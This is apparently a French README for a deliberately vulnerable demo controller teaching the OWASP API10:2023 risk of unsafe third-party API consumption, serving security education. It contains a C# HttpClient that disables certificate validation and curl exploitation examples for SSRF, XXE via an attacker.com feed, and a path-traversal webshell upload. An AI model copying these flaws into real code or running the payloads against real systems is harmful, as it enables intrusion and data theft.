# API10:2023 - Unsafe Consumption of APIs

## ?? Description de la vulnérabilité

La vulnérabilité **API10:2023 - Unsafe Consumption of APIs** se produit lorsqu'une application consomme des APIs tierces sans appliquer les contrôles de sécurité appropriés. Les développeurs ont tendance à faire davantage confiance aux données provenant d'APIs tierces qu'aux entrées utilisateur, ce qui crée des opportunités d'exploitation.

### Risques principaux :
- **Injection de données malveillantes** via des APIs compromises
- **Exposition de données sensibles** aux services tiers non fiables
- **Exécution de code arbitraire** via des réponses non validées
- **Attaques Man-in-the-Middle** par absence de validation SSL/TLS
- **Déni de service** par consommation excessive de ressources

## ?? Controller : Api10UnsafeConsumptionController

Ce controller démontre intentionnellement plusieurs scénarios vulnérables de consommation non sécurisée d'APIs tierces.

## ?? Scénarios vulnérables implémentés

### 1. **Weather API** - Injection de contenu non validé
```
GET /api/external/weather/{location}
```
**Vulnérabilités :**
- Injection possible dans l'URL via le paramètre `location`
- Désérialisation directe sans validation du contenu JSON
- Pas de timeout défini pour les requêtes
- Exposition de la réponse complète de l'API externe
- Détails d'erreur exposés (stack trace)

### 2. **Payment Processing** - Trust aveugle des données
```
POST /api/external/payment/process
```
**Vulnérabilités :**
- Utilisation de HTTP au lieu de HTTPS
- Logging des données de carte bancaire en clair
- Trust aveugle de la réponse du processeur de paiement
- Stockage des données sensibles dans la base
- Inclusion de métadonnées non validées

### 3. **User Verification** - Exposition de données sensibles
```
POST /api/external/verify/user
```
**Vulnérabilités :**
- Envoi du SSN (Social Security Number) en clair
- Désactivation de la validation SSL/TLS
- Utilisation d'endpoints non sécurisés par défaut
- Parse direct de la réponse sans validation
- Pas de limite de taille sur la réponse (DoS possible)

### 4. **Proxy Request** - Redirection non contrôlée (SSRF)
```
POST /api/external/proxy
```
**Vulnérabilités :**
- Permet de proxy vers n'importe quelle URL (SSRF)
- Copie tous les headers sans validation
- Suit automatiquement les redirections
- Expose l'URL finale après redirections
- Retourne les détails complets des exceptions

### 5. **RSS Aggregation** - Parsing XML non sécurisé
```
POST /api/external/rss/aggregate
```
**Vulnérabilités :**
- XXE (XML External Entity) injection possible
- Résolution d'URL externes activée
- Exécution de contenu HTML si demandé
- Contenu HTML non sanitisé retourné
- Continue le traitement malgré les erreurs

### 6. **Webhook Reception** - Exécution non validée
```
POST /api/external/webhook/receive
```
**Vulnérabilités :**
- Absence de validation de signature
- Exécution d'actions basées sur payload non validé
- Création d'utilisateurs avec données non vérifiées
- Exécution de commandes arbitraires
- Retour des données brutes du webhook

### 7. **API Aggregation** - Parallélisation non sécurisée
```
POST /api/external/aggregate
```
**Vulnérabilités :**
- Exécution parallèle sans limite (DoS possible)
- Ajout de tous les headers fournis sans validation
- Pas de timeout global
- Parse de n'importe quel type de contenu
- Retour du contenu brut en cas d'erreur

### 8. **Social Media Posting** - Intégration non sécurisée
```
POST /api/external/social/post
```
**Vulnérabilités :**
- Utilisation d'endpoints non vérifiés
- Clés API hardcodées dans le code
- Utilisation de HTTP au lieu de HTTPS
- Retour de la réponse brute des plateformes
- Pas de validation des plateformes

### 9. **File Upload** - Transfert non sécurisé
```
POST /api/external/file/upload
```
**Vulnérabilités :**
- Pas de validation de la taille du fichier
- Pas de validation du type de fichier
- Utilisation directe du nom de fichier client (Path Traversal)
- Accepte tous types d'extensions (.exe, .dll, etc.)
- Trust du Content-Type original
- Fichiers accessibles publiquement
- Exposition du chemin réel du serveur

## ?? Points d'entrée à risque

### Configuration HttpClient vulnérable :
```csharp
private static readonly HttpClient _unsafeClient = new HttpClient(new HttpClientHandler
{
    ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true,
    AllowAutoRedirect = true,
    MaxAutomaticRedirections = 10
});
```

### Points critiques :
- **Validation SSL désactivée** : Permet les attaques MitM
- **Redirections automatiques** : Peut conduire à des endpoints malveillants
- **Pas de timeout** : Vulnérable aux attaques DoS
- **Pas de limite de taille** : Épuisement mémoire possible

## ?? Exemples d'exploitation

### 1. Injection via Weather API
```bash
# Injection de caractères spéciaux dans l'URL
curl -X GET "http://localhost:5000/api/external/weather/Paris%27%20OR%201=1--"
```

### 2. SSRF via Proxy
```bash
# Accès aux services internes
curl -X POST "http://localhost:5000/api/external/proxy" \
  -H "Content-Type: application/json" \
  -d '{
    "targetUrl": "http://localhost:6379/",
    "method": "GET"
  }'
```

### 3. XXE via RSS
```bash
# Injection XXE pour lire des fichiers locaux
curl -X POST "http://localhost:5000/api/external/rss/aggregate" \
  -H "Content-Type: application/json" \
  -d '{
    "feedUrls": ["http://attacker.com/malicious-rss.xml"],
    "parseHtml": true
  }'
```

### 4. Path Traversal via File Upload
```bash
# Upload avec nom de fichier malveillant
curl -X POST "http://localhost:5000/api/external/file/upload" \
  -F "file=@malicious.aspx;filename=../../../wwwroot/shell.aspx"
```

## ??? Méthodes de mitigation recommandées

### 1. **Validation SSL/TLS stricte**
```csharp
// Configuration sécurisée
var handler = new HttpClientHandler
{
    // Laisser la validation SSL par défaut (activée)
    ServerCertificateCustomValidationCallback = null
};
```

### 2. **Liste blanche des URLs**
```csharp
private bool IsUrlAllowed(string url)
{
    var allowedHosts = new[] { "api.trusted.com", "storage.mycompany.com" };
    
    if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
        return false;
    
    if (uri.Scheme != "https")
        return false;
    
    if (!allowedHosts.Contains(uri.Host))
        return false;
    
    return true;
}
```

### 3. **Configuration de timeouts**
```csharp
using var client = new HttpClient()
{
    Timeout = TimeSpan.FromSeconds(30)
};
```

### 4. **Limitation de taille des réponses**
```csharp
client.MaxResponseContentBufferSize = 10 * 1024 * 1024; // 10 MB max

if (response.Content.Headers.ContentLength > 10 * 1024 * 1024)
{
    throw new InvalidOperationException("Réponse trop grande");
}
```

### 5. **Validation des données reçues**
```csharp
// Utiliser des DTOs avec validation
[Required]
[MaxLength(100)]
public string Location { get; set; }

// Valider avant désérialisation
var options = new JsonSerializerOptions
{
    MaxDepth = 32,
    PropertyNameCaseInsensitive = false
};
```

### 6. **Configuration XML sécurisée**
```csharp
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null,
    MaxCharactersFromEntities = 1024
};
```

### 7. **Validation des webhooks**
```csharp
// Vérifier la signature HMAC
private bool ValidateWebhookSignature(string payload, string signature)
{
    var secret = _configuration["WebhookSecret"];
    using var hmac = new HMACSHA256(Encoding.UTF8.GetBytes(secret));
    var computedHash = hmac.ComputeHash(Encoding.UTF8.GetBytes(payload));
    var computedSignature = Convert.ToBase64String(computedHash);
    return signature == computedSignature;
}
```

### 8. **Validation des fichiers uploadés**
```csharp
// Validation du nom de fichier
var fileName = Path.GetFileName(file.FileName);
fileName = Path.GetRandomFileName() + Path.GetExtension(fileName);

// Validation de l'extension
var allowedExtensions = new[] { ".jpg", ".png", ".pdf" };
if (!allowedExtensions.Contains(Path.GetExtension(fileName)))
    throw new InvalidOperationException("Type de fichier non autorisé");

// Validation de la taille
if (file.Length > 10 * 1024 * 1024) // 10 MB
    throw new InvalidOperationException("Fichier trop volumineux");
```

## ?? Tests et démonstrations

### Tests de sécurité recommandés :

1. **Test de validation SSL** : Tentez de vous connecter à des endpoints avec certificats invalides
2. **Test SSRF** : Essayez d'accéder aux services internes via le proxy
3. **Test XXE** : Injectez des entités externes dans les flux RSS
4. **Test de timeout** : Envoyez des requêtes vers des endpoints lents
5. **Test de taille** : Tentez de recevoir des réponses très volumineuses
6. **Test d'injection** : Injectez des payloads malveillants dans les paramètres
7. **Test de path traversal** : Utilisez des noms de fichiers avec ../
8. **Test de webhook** : Envoyez des webhooks sans signature valide

## ?? Références OWASP

- [OWASP API Security Top 10 2023 - API10:2023](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

## ?? AVERTISSEMENT

**CE CODE CONTIENT INTENTIONNELLEMENT DES VULNÉRABILITÉS À DES FINS ÉDUCATIVES.**

**NE JAMAIS UTILISER CE CODE EN PRODUCTION !**

Ce controller fait partie d'une application de démonstration pour l'apprentissage de la sécurité des APIs. Il illustre les mauvaises pratiques à éviter lors de la consommation d'APIs tierces.